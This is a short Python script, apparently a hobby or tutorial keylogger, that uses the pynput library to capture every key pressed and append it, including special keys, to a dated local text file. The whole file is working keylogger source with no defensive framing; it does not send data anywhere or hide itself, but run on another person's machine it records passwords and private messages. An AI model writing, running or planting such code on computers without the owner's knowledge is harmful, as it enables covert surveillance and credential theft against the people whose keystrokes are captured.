from pynput import keyboard
import datetime

#file to log the keystrokes
log_file = f"keylog_{datetime.date.today()}.txt"

#function will be called everytime a key is pressed
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f'{key.char}')
        except:
            f.write(f'[{key}]') #for special keys like enter, space, etc

#start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

